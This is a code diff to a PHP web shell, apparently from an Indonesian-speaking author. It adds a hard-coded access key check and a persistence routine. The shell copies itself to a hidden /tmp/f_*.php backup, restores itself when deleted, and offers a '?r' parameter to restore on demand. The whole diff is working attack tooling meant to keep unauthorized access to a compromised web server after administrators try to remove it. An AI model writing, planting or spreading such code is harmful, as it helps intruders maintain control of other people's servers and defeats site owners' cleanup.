@@ -7,8 +7,40 @@
 	Date:		Monday, September 14, 2020
 */
 
-$AUTH_KEY = 'InViSiBLe55SOLe';
+$AUTH_KEY = 'ForIDen123';
 $PARAM_NAME = 'x';
+
+$backup_files = glob("/tmp/f_*.php");
+$backup_file = !empty($backup_files) ? $backup_files[0] : null;
+
+if(!$backup_file) {
+    $backup_file = "/tmp/f_" . bin2hex(random_bytes(8)) . ".php";
+    $shell_code = file_get_contents(__FILE__);
+    
+    $shell_code = preg_replace(
+        '/\$AUTH_KEY\s*=\s*[\'"].*?[\'"]/',
+        '$AUTH_KEY = \'' . $AUTH_KEY . '\'',
+        $shell_code
+    );
+    
+    file_put_contents($backup_file, $shell_code);
+    chmod($backup_file, 0755);
+}
+
+if(!file_exists(__FILE__) && $backup_file && file_exists($backup_file)) {
+    copy($backup_file, __FILE__);
+    chmod(__FILE__, 0755);
+    // Redirect biar tetep akses
+    header('Location: ' . $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING']);
+    exit;
+}
+
+if(isset($_GET['r']) && $backup_file && file_exists($backup_file)) {
+    copy($backup_file, __FILE__);
+    chmod(__FILE__, 0755);
+    echo "Shell restored from backup!";
+    exit;
+}
 
 if(!isset($_GET[$PARAM_NAME]) || $_GET[$PARAM_NAME] !== $AUTH_KEY) {
     header('HTTP/1.0 403 Forbidden');
